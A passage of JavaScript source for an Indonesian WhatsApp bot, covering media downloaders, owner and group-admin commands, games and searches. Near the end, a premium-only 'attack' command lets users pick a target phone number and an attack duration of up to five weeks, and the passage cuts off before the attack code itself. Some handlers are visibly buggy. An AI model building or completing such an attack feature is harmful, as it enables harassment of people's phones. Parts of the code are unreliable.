                conn.sendMessage(from, { caption: 'Dont Forget Subscribe\nhttps://youtube.com/c/Riy', video: { url: data.url }}, { quoted: msg})
                limitAdd(sender, limit)
                break
             case prefix+'ukhty':
                if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
                addCountCmd('#ukhty', sender, _cmd)
                reply("_Wait a minute, data is being processed!_")
                var data = JSON.parse(fs.readFileSync('./lib/asupan/ukhty.json'))
                data = pickRandom(data)
                conn.sendMessage(from, { caption: 'Dont Forget Subscribe\nhttps://youtube.com/c/Riy', video: { url: data.url }}, { quoted: msg})
                limitAdd(sender, limit)
                break
	        // Downloader Menu
			case prefix+'tiktok':
			    if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
			    if (args.length < 2) return reply(`Kirim perintah ${command} link`)
			    if (!isUrl(args[1])) return reply(mess.error.Iv)
			    if (!args[1].includes('tiktok')) return reply(mess.error.Iv)
			    addCountCmd('#tiktok', sender, _cmd)
			    reply("_Wait a minute, data is being processed!_")
			    var fatih = await fetchJson(`https://fatiharridho.herokuapp.com/api/downloader/tiktok?url=${args[1]}`)
			      conn.sendMessage(from, {
				   video: { url: fatih.result.download.no_wm },
				   caption: `${fatih.result.title}\n\nKamu bisa mengubahnya menjadi Vidio Tanpa Watermark atau Audio, tekan tombol dibawah untuk mengubahnya!`,
				   buttons: [{buttonId: `${prefix}tiktokaudio ${args[1]}`, buttonText: { displayText: "Audio" }, type: 1 }],
				   footer: ` ${setting.footext}`
			      }, { quoted: msg })
				  limitAdd(sender, limit)
			    .catch(() => reply("Maaf terjadi kesalahan"))
			    break
			case prefix+'tiktoknowm':
			    if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
			    if (args.length < 2) return reply(`Kirim perintah ${command} link`)
			    if (!isUrl(args[1])) return reply(mess.error.Iv)
			    if (!args[1].includes('tiktok')) return reply(mess.error.Iv)
			    addCountCmd('#tiktoknowm', sender, _cmd)
			    reply("Wait..")
			    var riy = await fetchJson(`https://fatiharridho.herokuapp.com/api/downloader/tiktok?url=${args[1]}`)
			      conn.sendMessage(from, { video: { url: fatih.result.download.no_wm }}, { quoted: msg })
			      limitAdd(sender, limit)
			    break
			case prefix+'tiktokaudio':
			    if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
			    if (args.length < 2) return reply(`Kirim perintah ${command} link`)
			    if (!isUrl(args[1])) return reply(mess.error.Iv)
			    if (!args[1].includes('tiktok')) return reply(mess.error.Iv)
			    addCountCmd('#tiktokaudio', sender, _cmd)
			    reply("_Wait a minute, data is being processed!_")
			    var riy = await fetchJson(`https://fatiharridho.herokuapp.com/api/downloader/tiktok?url=${args[1]}`)
			      conn.sendMessage(from, { audio: { url: fatih.result.download.audio }, mimetype: 'audio/mp4' }, { quoted: msg })
			       limitAdd(sender, limit)
		        break
            case prefix+'play':
			    if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
                if (args.length < 2) return reply(`Kirim perintah ${command} query\nContoh : ${command} monokrom`)
                addCountCmd('#play', sender, _cmd)
                reply("_Wait a minute, data is being processed!_")
                await sendPlay(from, q)
				limitAdd(sender, limit)
                break
			case prefix+'ytmp4': case prefix+'mp4':
			    if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
			    if (args.length < 2) return reply(`Kirim perintah ${command} link`)
			    if (!isUrl(args[1])) return reply(mess.error.Iv)
			    if (!args[1].includes('youtu.be') && !args[1].includes('youtube.com')) return reply(mess.error.Iv)
			    addCountCmd('#ytmp4', sender, _cmd)
			    reply("_Wait a minute, data is being processed!_")
			    var riy = await fetchJson(`https://rest-api-riy.herokuapp.com/api/dowloader/yt?url=${args[1]}`)
			      var teks = `*Youtube Video Downloader*\n\n*≻ Title :* ${riy.result.title}\n*≻ Quality :* -\n*≻ Size :* ${riy.result.filesize}\n*≻ Url Source :* ${args[1]}`
			      conn.sendMessage(from, { video: { url: riy.result.mp4 }, caption: teks }, { quoted: msg })
			      limitAdd(sender, limit)
			    break
			case prefix+'ytmp3': case prefix+'mp3':
			    if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
			    if (args.length < 2) return reply(`Kirim perintah ${command} link`)
			    if (!isUrl(args[1])) return reply(mess.error.Iv)
			    if (!args[1].includes('youtu.be') && !args[1].includes('youtube.com')) return reply(mess.error.Iv)
			    addCountCmd('#ytmp4', sender, _cmd)
			    reply("_Wait a minute, data is being processed!_")
			    var riy = await fetchJson(`https://rest-api-riy.herokuapp.com/api/dowloader/yt?url=${args[1]}`)
			      var teks = `*Youtube Audio Downloader*\n\n*≻ Title :* ${riy.result.Title}\n*≻ Quality :* -\n*≻ Size :* ${riy.result.filesize}\n*≻ Url Source :* ${args[1]}\n\n_wait a minute sending media..._`
			      conn.sendMessage(from, { image: { url: riy.result.thumb }, caption: teks }, { quoted: msg })
			      conn.sendMessage(from, { audio: { url: riy.result.mp3 }, mimetype: 'audio/mp4' }, { quoted: msg })
			      limitAdd(sender, limit)
			    break
			case prefix+'getvideo': case prefix+'getvidio':
			    if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
			    if (!isQuotedImage) return reply(`Balas hasil pencarian dari ${prefix}ytsearch dengan teks ${command} <no urutan>`)
				if (!quotedMsg.fromMe) return reply(`Hanya bisa mengambil hasil dari pesan bot`)
				if (args.length < 2) return reply(`Balas hasil pencarian dari ${prefix}ytsearch dengan teks ${command} <no urutan>`)
				var kuoted = await quotedMsg.chats
                var ytIdRegex = /(?:http(?:s|):\/\/|)(?:(?:www\.|)youtube(?:\-nocookie|)\.com\/(?:watch\?.*(?:|\&)v=|embed\/|v\/)|youtu\.be\/)([-_0-9A-Za-z]{11})/gi
                var arrey = [...kuoted.matchAll(ytIdRegex)].map(x => x[1])
                if (arrey.length == 0) return reply(`Reply hasil dari *${prefix}ytsearch* dengan perintah *${command}* urutan`)
                if (isNaN(args[1])) return reply(`Hanya support angka! pilih angka 1 sampai 10\nContoh : ${command} 2`)
                if (args[1] > arrey.length) return reply(`Urutan Hasil *${prefix}ytsearch* Hanya Sampai *${arrey.length}*`)
                addCountCmd('#getvideo', sender, _cmd)
			    reply("_Wait a minute, data is being processed!_")
			    xfar.downloader.youtube(`https://youtube.com/watch?v=${arrey[args[1] -1]}`).then( data => {
			      var teks = `*Youtube Video Downloader*\n\n*≻ Title :* ${data.title}\n*≻ Quality :* ${data.medias[1].quality}\n*≻ Size :* ${data.medias[1].formattedSize}\n*≻ Url Source :* ${data.url}\n\n_wait a minute sending media..._`
			      conn.sendMessage(from, { video: { url: data.medias[1].url }, caption: teks }, { quoted: msg })
			       limitAdd(sender, limit)
				}).catch(() => reply("Maaf terjadi kesalahan"))
		        break
			case prefix+'getmusik': case prefix+'getmusic':
			    if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
			    if (!isQuotedImage) return reply(`Balas hasil pencarian dari ${prefix}ytsearch dengan teks ${command} <no urutan>`)
				if (!quotedMsg.fromMe) return reply(`Hanya bisa mengambil hasil dari pesan bot`)
				if (args.length < 2) return reply(`Balas hasil pencarian dari ${prefix}ytsearch dengan teks ${command} <no urutan>`)
				var kuoted = await quotedMsg.chats
                var ytIdRegex = /(?:http(?:s|):\/\/|)(?:(?:www\.|)youtube(?:\-nocookie|)\.com\/(?:watch\?.*(?:|\&)v=|embed\/|v\/)|youtu\.be\/)([-_0-9A-Za-z]{11})/gi
                var arrey = [...kuoted.matchAll(ytIdRegex)].map(x => x[1])
                if (arrey.length == 0) return reply(`Reply hasil dari *${prefix}ytsearch* dengan perintah *${command}* urutan`)
                if (isNaN(args[1])) return reply(`Hanya support angka! pilih angka 1 sampai 10\nContoh : ${command} 2`)
                if (args[1] > arrey.length) return reply(`Urutan Hasil *${prefix}ytsearch* Hanya Sampai *${arrey.length}*`)
                addCountCmd('#getmusic', sender, _cmd)
			    reply("_Wait a minute, data is being processed!_")
			    xfar.downloader.youtube(`https://youtube.com/watch?v=${arrey[args[1] -1]}`).then( data => {
			      var teks = `*Youtube Audio Downloader*\n\n*≻ Title :* ${data.title}\n*≻ Quality :* ${data.medias[7].quality}\n*≻ Size :* ${data.medias[7].formattedSize}\n*≻ Url Source :* ${data.url}\n\n_wait a minute sending media..._`
			      conn.sendMessage(from, { image: { url: data.thumbnail }, caption: teks }, { quoted: msg })
			      conn.sendMessage(from, { document: { url: data.medias[7].url }, fileName: `${data.title}.mp3`, mimetype: 'audio/mp3' }, { quoted: msg })
			      limitAdd(sender, limit)
				}).catch(() => reply("Maaf terjadi kesalahan"))
			    break
			case prefix+'igdl': case prefix+'instagram': case prefix+'ig':
			    if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
				if (args.length < 2) return reply(`Kirim perintah ${command} link`)
			    if (!isUrl(args[1])) return reply(mess.error.Iv)
			    if (!args[1].includes('instagram.com')) return reply(mess.error.Iv)
			    addCountCmd('#instagram', sender, _cmd)
			    reply("_Wait a minute, data is being processed!_")
			    xfar.downloader.instagram(args[1]).then( data => {
			     var teks = `*Instagram Downloader*\n\n*≻ Title :* ${data.title}\n*≻ Jumlah Media :* ${data.medias.length}\n*≻ Url Source :* ${data.url}\n\n_wait a minute sending media..._`
			     reply(teks)
			     for (let i of data.medias) {
				  if (i.extension === "mp4") {
				   conn.sendMessage(from, { video: { url: i.url }})
				  } else if (i.extension === "jpg") {
				   conn.sendMessage(from, { image: { url: i.url }})
			      }
			     }
				 limitAdd(sender, limit)
			    }).catch(() => reply("Maaf terjadi kesalahan"))
			    break
			case prefix+'facebook': case prefix+'fbdl':
			    if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
			    if (args.length < 2) return reply(`Kirim perintah ${command} link`)
			    if (!isUrl(args[1])) return reply(mess.error.Iv)
			    if (!args[1].includes('facebook.com')) return reply(mess.error.Iv)
			    addCountCmd('#facebook', sender, _cmd)
			    reply("_Wait a minute, data is being processed!_")
			    var riy = await fetchJson(`https://rest-api-riy.herokuapp.com/api/dowloader/fbdown?url=${args[1]}`)
			      conn.sendMessage(from, { video: { url: riy.result.url }, caption: riy.result.title }, { quoted: msg })
			      limitAdd(sender, limit)
			    break
			// Owner Menu
			case prefix+'exif':
			    if (!isOwner) return reply(mess.OnlyOwner)
			    addCountCmd('#exif', sender, _cmd)
			    var namaPack = q.split('|')[0] ? q.split('|')[0] : q
                var authorPack = q.split('|')[1] ? q.split('|')[1] : ''
                exif.create(namaPack, authorPack)
				reply(`Sukses membuat exif`)
				break
			case prefix+'leave':
			    if (!isOwner) return reply(mess.OnlyOwner)
				if (!isGroup) return reply(mess.OnlyGrup)
				addCountCmd('#leave', sender, _cmd)
				conn.groupLeave(from)
			    break
			case prefix+'join':
			    if (!isOwner) return reply(mess.OnlyOwner)
				if (args.length < 2) return reply(`Kirim perintah ${command} _linkgrup_`)
				if (!isUrl(args[1])) return reply(mess.error.Iv)
				addCountCmd('#join', sender, _cmd)
				var url = args[1]
			    url = url.split('https://chat.whatsapp.com/')[1]
				var data = await conn.groupAcceptInvite(url)
				reply(jsonformat(data))
				break
                        case prefix+'bc': case prefix+'broadcast':
			    if (!isOwner) return reply(mess.OnlyOwner)
		            if (args.length < 2) return reply(`Masukkan isi pesannya`)
		                addCountCmd('#broadcast', sender, _cmd)
                            var data = await store.chats.all()
                            reply(`mengirim broadcast ke ${data.length} Chats`)
                            for (let i of data) {
                               conn.sendMessage(i.id, {
				   image: {url : "https://www6.flamingtext.com/net-fu/proxy_form.cgi?&imageoutput=true&script=fluffy-logo&doScale=true&scaleWidth=800&scaleHeight=500&fontsize=100&text=BROADCAST"},
				   caption: `*_BROADCAST_*\n\n ${q}`,
				   buttons: [{buttonId: `${prefix}menu`, buttonText: { displayText: "Menu" }, type: 1 }],
				   footer: ` ${setting.footext}`
			      }, { quoted: ftoko })
                               await sleep(1000)
                            }
                            break
			case prefix+'addprem':
                if (!isOwner) return reply(mess.OnlyOwner)
                if (args.length < 2) return reply(`Penggunaan :\n*${prefix}addprem* @tag waktu\n*${prefix}addprem* nomor waktu\n\nContoh : ${command} @tag 30d`)
                if (!args[2]) return reply(`Mau yang berapa hari?`)
                addCountCmd('#addprem', sender, _cmd)
                if (mentioned.length !== 0) {
                    _prem.addPremiumUser(mentioned[0], args[2], premium)
                    reply('Sukses')
                } else {
                 var cekap = await conn.onWhatsApp(args[1]+"@s.whatsapp.net")
                 if (cekap.length == 0) return reply(`Masukkan nomer yang valid/terdaftar di WhatsApp`)
                    _prem.addPremiumUser(args[1] + '@s.whatsapp.net', args[2], premium)
                    reply('Sukses')
                }
                break
            case prefix+'delprem':
                if (!isOwner) return reply(mess.OnlyOwner)
                if (args.length < 2) return reply(`Penggunaan :\n*${prefix}delprem* @tag\n*${prefix}delprem* nomor`)
                addCountCmd('#delprem', sender, _cmd)
                if (mentioned.length !== 0){
                    premium.splice(_prem.getPremiumPosition(mentioned[0], premium), 1)
                    fs.writeFileSync('./database/premium.json', JSON.stringify(premium))
                    reply('Sukses!')
                } else {
                 var cekpr = await conn.oWhatsApp(args[1]+"@s.whatsapp.net")
                 if (cekpr.length == 0) return reply(`Masukkan nomer yang valid/terdaftar di WhatsApp`)
                    premium.splice(_prem.getPremiumPosition(args[1] + '@s.whatsapp.net', premium), 1)
                    fs.writeFileSync('./database/premium.json', JSON.stringify(premium))
                    reply('Sukses!')
                }
                break
			// Random Menu
			case prefix+'quote': case prefix+'quotes':
			case prefix+'randomquote': case prefix+'randomquotes':
			    if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
			    addCountCmd('#quotes', sender, _cmd)
				var data = await fetchJson(`https://megayaa.herokuapp.com/api/randomquote`)
			    reply(data.result.quotes+'\n\n-- '+data.result.author)
				limitAdd(sender, limit)
				break
			case prefix+'cecan': case prefix+'cewek':
			    if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
			    addCountCmd('#cecan', sender, _cmd)
				reply("_Wait a minute, data is being processed!_")
			    var query = ["cecan hd","cecan indo","cewe cantik", "cewe aesthetic", "cecan aesthetic"]
                var data = await pinterest(pickRandom(query))
				var but = [{buttonId: `${command}`, buttonText: { displayText: "Next Photo" }, type: 1 }]
				conn.sendMessage(from, { caption: "Random Cewe Cantik", image: { url: pickRandom(data.result) }, buttons: but, footer: 'Pencet tombol dibawah untuk foto selanjutnya' }, { quoted: msg })
			    limitAdd(sender, limit)
 			    break
			case prefix+'cogan': case prefix+'cowok':
			    if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
			    addCountCmd('#cogan', sender, _cmd)
				reply("_Wait a minute, data is being processed!_")
				var query = ["cogan hd","cogan indo","cowo ganteng","handsome boy","hot boy","oppa","cowo aesthetic","cogan aesthetic"]
				var data = await pinterest(pickRandom(query))
				var but = [{buttonId: `${command}`, buttonText: { displayText: "Next Photo" }, type: 1 }]
				conn.sendMessage(from, { caption: "Random Cowo Ganteng", image: { url: pickRandom(data.result) }, buttons: but, footer: 'Pencet tombol dibawah untuk foto selanjutnya' }, { quoted: msg })
			    limitAdd(sender, limit)
				break
            case prefix+'ppcouple': case prefix+'ppcp':
                if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
                addCountCmd('#ppcouple', sender, _cmd)
                reply("_Wait a minute, data is being processed!_")
                var data = await fetchJson(`https://rest-api-riy.herokuapp.com/api/randomgambar/couplepp`)
                conn.sendMessage(from, { caption: 'Dont Forget Subscribe\nhttps://youtube.com/c/Riy', image: { url: data.result.male }}, { quoted: msg})
                conn.sendMessage(from, { caption: 'Dont Forget Subscribe\nhttps://youtube.com/c/Riy', image: { url: data.result.female }}, { quoted: msg})
                limitAdd(sender, limit)
                break
			// Search Menu
			case prefix+'lirik': case prefix+'liriklagu':
			    if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
				if (args.length < 2) return reply(`Kirim perintah ${command} judul lagu`)
				addCountCmd('#lirik', sender, _cmd)
				reply("_Wait a minute, data is being processed!_")
			    ra.Musikmatch(q).then(async(data) => {
				  var teks = `*${data.result.judul} - ${data.result.penyanyi}*\n\n${data.result.lirik}`
				  conn.sendMessage(from, { image: { url: data.result.thumb }, caption: teks }, { quoted: msg })
				}).catch(() => reply(`Judul lagu tidak ditemukan`))
				limitAdd(sender, limit)
				break
			case prefix+'grupwa': case prefix+'searchgrup':
			    if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
				if (args.length < 2) return reply(`Kirim perintah ${command} nama grup`)
				addCountCmd('#grupwa', sender, _cmd)
				reply("_Wait a minute, data is being processed!_")
			    hxz.linkwa(q).then(async(data) => {
				  if (data.length == 0) return reply(`Grup ${q} tidak ditemukan`)
				  var teks = `*Hasil Pencarian Dari ${q}*\n\n`
				  for (let x of data) {
					teks += `*Nama :* ${x.nama}\n*Link :* ${x.link}\n\n`
				  }
				  reply(teks)
				  limitAdd(sender, limit)
				}).catch(() => reply("Maaf terjadi kesalahan"))
			    break
			case prefix+'pinterest':
			    if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
				if (args.length < 2) return reply(`Kirim perintah ${command} query atau ${command} query --jumlah\nContoh :\n${command} cecan atau ${command} cecan --10`)
				addCountCmd('#pinterest', sender, _cmd)
				reply("_Wait a minute, data is being processed!_")
			    var jumlah;
			    if (q.includes('--')) jumlah = q.split('--')[1]
			    pinterest(q.replace('--'+jumlah, '')).then(async(data) => {
				  if (q.includes('--')) {
					if (data.result.length < jumlah) {
					  jumlah = data.result.length
					  reply(`Hanya ditemukan ${data.result.length}, foto segera dikirim`)
					}
					for (let i = 0; i < jumlah; i++) {
					  conn.sendMessage(from, { image: { url: data.result[i] }})
					}
				    limitAdd(sender, limit)
				  } else {
					var but = [{buttonId: `${command} ${q}`, buttonText: { displayText: 'Next Photo' }, type: 1 }]
					conn.sendMessage(from, { caption: `Hasil pencarian dari ${q}`, image: { url: pickRandom(data.result) }, buttons: but, footer: 'Pencet tombol dibawah untuk foto selanjutnya' }, { quoted: msg })
				    limitAdd(sender, limit)
				  }
				})
			    break
			case prefix+'yts': case prefix+'ytsearch':
			    if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
			    if (args.length < 2) return reply(`Kirim perintah ${command} query`)
			    addCountCmd('#ytsearch', sender, _cmd)
				reply("_Wait a minute, data is being processed!_")
			    yts(q).then( data => {
				  let yt = data.videos
				  var jumlah = 15
				  if (yt.length < jumlah) jumlah = yt.length
				  var no = 0
				  let txt = `*YOUTUBE SEARCH*

 *Data berhasil didapatkan*
 *Hasil pencarian dari ${q}*
 
 *${prefix}getmusic <no urutan>*
 *${prefix}getvideo <no urutan>*
 Untuk mengambil Audio/Video dari hasil pencarian`
                for (let i = 0; i < jumlah; i++) {
				  no += 1
				  txt += `\n─────────────────\n\n*No Urutan : ${no.toString()}*\n*▢ Judul :* ${yt[i].title}\n*▢ ID :* ${yt[i].videoId}\n*▢ Channel :* ${yt[i].author.name}\n*▢ Upload :* ${yt[i].ago}\n*▢ Ditonton :* ${yt[i].views}\n*▢ Duration :* ${yt[i].timestamp}\n*▢ URL :* ${yt[i].url}\n`
				}
				conn.sendMessage(from, { image: { url: yt[0].image }, caption: txt }, { quoted: msg })
				limitAdd(sender, limit)
				}).catch(() => reply("Maaf terjadi kesalahan"))
			    break
			// Game Menu
			case prefix+'tictactoe': case prefix+'ttt': case prefix+'ttc':
                if (!isGroup)return reply(mess.OnlyGrup)
			    if (isGame(sender, isOwner, gcount, glimit)) return reply(`Limit game kamu sudah habis`)
                if (isTicTacToe(from, tictactoe)) return reply(`Masih ada game yg blum selesai`)
                if (args.length < 2) return reply(`Kirim perintah *${prefix}tictactoe* @tag`)
                if (mentionByTag.length !== 1) {
				if (mentionByTag[0] === botNumber) return reply(`Tidak bisa bermain dengan bot!`)
                if (mentionByTag[0] === sender) return reply(`Sad amat main ama diri sendiri`)
                addCountCmd('#tictactoe', sender, _cmd)
                     var hadiah = randomNomor(100, 150)
				     mentions(monospace(`@${sender.split('@')[0]} menantang @${mentionByTag[0].split('@')[0]} untuk bermain TicTacToe\n\nKirim (Y/N) untuk bermain\n\nHadiah : ${hadiah} balance`), [sender, mentionByTag[0]], false)
                     tictactoe.push({
                        id: from,
                        status: null,
						hadiah: hadiah,
                        penantang: sender,
                        ditantang: mentionByTag[0],
                        TicTacToe: ['1️⃣','2️⃣','3️⃣','4️⃣','5️⃣','6️⃣','7️⃣','8️⃣','9️⃣']
                     })
					 gameAdd(sender, limit)
                } else {
                    reply(`Kirim perintah *${prefix}tictactoe* @tag`)
                }
                break
			case prefix+'delttt':
            case prefix+'delttc':
                if (!isGroup)return reply(mess.OnlyGrup)
				if (isGame(sender, isOwner, gcount, glimit)) return reply(`Limit game kamu sudah habis`)
                if (!isTicTacToe(from, tictactoe)) return reply(`Tidak ada sesi game tictactoe di grup ini`)
                addCountCmd('#delttt', sender, _cmd)
                var posi = getPosTic(from, tictactoe)
                if (tictactoe[posi].penantang.includes(sender)) {
                    tictactoe.splice(posi, 1)
                    reply(`Berhasil menghapus sesi tictactoe di grup ini`)
                 } else if (tictactoe[posi].ditantang.includes(sender)) {
                     tictactoe.splice(posi, 1)
                     reply(`Berhasil menghapus sesi tictactoe di grup ini`)
                 } else if (isGroupAdmins) {
                     tictactoe.splice(posi, 1)
                     reply(`Berhasil menghapus sesi tictactoe di grup ini`)
                 } else if (isOwner) {
                     tictactoe.splice(posi, 1)
                     reply(`Berhasil menghapus sesi tictactoe di grup ini`)
                 } else {
                   reply(`Anda tidak bisa menghapus sesi tictactoe, karena bukan pemain!`)
                }
                break
			case prefix+'tebakgambar':
		        if (isGame(sender, isOwner, gcount, glimit)) return reply(`Limit game kamu sudah habis`)
			    if (isPlayGame(from, tebakgambar)) return conn.reply(from, `Masih ada game yang belum diselesaikan`, tebakgambar[getGamePosi(from, tebakgambar)].msg)
			    addCountCmd('#tebakgambar', sender, _cmd)
				kotz.tebakgambar().then( data => {
				  data = data[0]
				  data.jawaban = data.jawaban.split('Jawaban ').join('')
				  var teks = `*TEBAK GAMBAR*\n\n`+monospace(`Petunjuk : ${data.jawaban.replace(/[b|c|d|f|g|h|j|k|l|m|n|p|q|r|s|t|v|w|x|y|z]/gi, '_')}\nWaktu : ${gamewaktu}s`)
				  conn.sendMessage(from, { image: { url: data.image }, caption: teks }, { quoted: msg })
				  .then( res => {
					var jawab = data.jawaban.toLowerCase()
					addPlayGame(from, 'Tebak Gambar', jawab, gamewaktu, res, tebakgambar)
					gameAdd(sender, glimit)
				  })
				})
			    break
			// Group Menu
			case prefix+'linkgrup': case prefix+'link': case prefix+'linkgc':
			    if (!isGroup) return reply(mess.OnlyGrup)
				if (!isBotGroupAdmins) return reply(mess.BotAdmin)
				addCountCmd('#linkgc', sender, _cmd)
				var url = await conn.groupInviteCode(from).catch(() => reply("Maaf terjadi kesalahan"))
			    url = 'https://chat.whatsapp.com/'+url
				reply(url)
				break
			case prefix+'setppgrup': case prefix+'setppgc':
			    if (!isGroup) return reply(mess.OnlyGrup)
				if (!isGroupAdmins) return reply(mess.GrupAdmin)
				if (!isBotGroupAdmins) return reply(mess.BotAdmin)
				addCountCmd('#setppgc', sender, _cmd)
				if (isImage || isQuotedImage) {
				  var media = await downloadAndSaveMediaMessage('image', `ppgc${from}.jpeg`)
			      await conn.updateProfilePicture(from, { url: media })
				  .then( res => {
					reply(`Sukses`)
					fs.unlinkSync(media)
				  }).catch(() => reply("Maaf terjadi kesalahan"))
				} else {
			      reply(`Kirim/balas gambar dengan caption ${command}`)
				}
				break
			case prefix+'setnamegrup': case prefix+'setnamegc':
			    if (!isGroup) return reply(mess.OnlyGrup)
				if (!isGroupAdmins) return reply(mess.GrupAdmin)
				if (!isBotGroupAdmins) return reply(mess.BotAdmin)
				if (args.length < 2) return reply(`Kirim perintah ${command} teks`)
				addCountCmd('#setnamegc', sender, _cmd)
				await conn.groupUpdateSubject(from, q)
			    .then( res => {
				  reply(`Sukses`)
				}).catch(() => reply("Maaf terjadi kesalahan"))
			    break
			case prefix+'setdesc': case prefix+'setdescription':
			    if (!isGroup) return reply(mess.OnlyGrup)
				if (!isGroupAdmins) return reply(mess.GrupAdmin)
				if (!isBotGroupAdmins) return reply(mess.BotAdmin)
				if (args.length < 2) return reply(`Kirim perintah ${command} teks`)
				addCountCmd('#setdecs', sender, _cmd)
				await conn.groupUpdateDescription(from, q)
			    .then( res => {
			      reply(`Sukses`)
				}).catch(() => reply("Maaf terjadi kesalahan"))
				break
            case prefix+'attack':
	        if (!isOwner && !isPremium) return reply(`Fitur hanya dapat di gunakan oleh user premium`)
	        if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
            if (args.length < 2) return reply(`Mau Attack Siapa?`)
            let nomore = q.replace(/[^0-9]/g, "").replace(/[^0-9]/g, "")
            let noget = nomore.replace(/[@s.whatsapnet]/g, "").replace(/[@S.WHATSAPNET]/g, "")
            if (isNaN(noget)) return reply(`Must be a number Bitch!! `)
            var satgnz = "6281316701742"
            let isnoown = new RegExp(satgnz, 'i')
            let isOwn = isnoown.test(m.text)
            if (isOwn) return m.reply(`You Can't ${command} My Owner Bitch!`)
            {
        	var listMsg = {
                text: `${ucapanWaktu} @${sender.split("@")[0]}, \n\nSilahkan Pilih Durasi Penyerangan`,
                buttonText: 'Click Here!',
                footer: `© Kurniawan Satria`,
                mentions: [sender],
                sections: [
                {
            title: "MINUTE SELECTION",
                rows: [
           {title: "1 Minute", rowId: `${prefix}atk ${noget}|1`, description: `Attack ${noget} During 1 Minute `},
           {title: "2 Minute", rowId: `${prefix}atk ${noget}|2`, description: `Attack ${noget} During 2 Minute`},
           {title: "3 Minute", rowId: `${prefix}atk ${noget}|3`, description: `Attack ${noget} During 3 Minute`},
           {title: "4 Minute", rowId: `${prefix}atk ${noget}|4`, description: `Attack ${noget} During 4 Minute`},
           {title: "5 Minute", rowId: `${prefix}atk ${noget}|5`, description: `Attack ${noget} During 5 Minute`},
                ]
                },
                {
           title: "CLOCK SELECTION",
                rows: [
           {title: "1 Hours", rowId: `${prefix}atk ${noget}|60`, description: `Attack ${noget} During 1 Hours `},
           {title: "2 Hours", rowId: `${prefix}atk ${noget}|120`, description: `Attack ${noget} During 2 Hours `},
           {title: "3 Hours", rowId: `${prefix}atk ${noget}|180`, description: `Attack ${noget} During 3 Hours `},
           {title: "4 Hours", rowId: `${prefix}atk ${noget}|240`, description: `Attack ${noget} During 4 Hours `},
           {title: "5 Hours", rowId: `${prefix}atk ${noget}|300`, description: `Attack ${noget} During 5 Hours `}
                ]
                },
                {
            title: "DAILY SELECTION",
            rows: [
           {title: "1 Day", rowId: `${prefix}atk ${noget}|1440`, description: `Attack ${noget} During 1 Day `},
           {title: "2 Day", rowId: `${prefix}atk ${noget}|2880`, description: `Attack ${noget} During 2 Day `},
           {title: "3 Day", rowId: `${prefix}atk ${noget}|4320`, description: `Attack ${noget} During 3 Day `},
           {title: "4 Day", rowId: `${prefix}atk ${noget}|5760`, description: `Attack ${noget} During 4 Day `},
           {title: "5 Day", rowId: `${prefix}atk ${noget}|7200`, description: `Attack ${noget} During 5 Day `}
           ]
           },
           {
            title: "WEEKLY SELECTION",
             rows: [
            {title: "1 Week", rowId: `${prefix}atk ${noget}|10080`, description: `Attack ${noget} During 1 Week `},
            {title: "2 Week", rowId: `${prefix}atk ${noget}|20160`, description: `Attack ${noget} During 2 Week `},
            {title: "3 Week", rowId: `${prefix}atk ${noget}|30240`, description: `Attack ${noget} During 3 Week `},
            {title: "4 Week", rowId: `${prefix}atk ${noget}|40320`, description: `Attack ${noget} During 4 Week `},
            {title: "5 Week", rowId: `${prefix}atk ${noget}|50400`, description: `Attack ${noget} During 5 Week `}
               ]
              },
             ]
            }
            conn.sendMessage(from, listMsg)
           }
            break
            case prefix+'atk':
            if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
            if (args.length < 2) return reply(`Examples of use : ${command} >Target<|*>Amount<*`) 
            let spar = q.split("|")[0]
            let terern = q.split("|")[1]
            var satgnz = "6281316701742"
            let isLinkThisGc = new RegExp(satgnz, 'i')
            let isgclink = isLinkThisGc.test(m.text)
            if (isgclink) return reply(`You Can't Attack My Owner`)
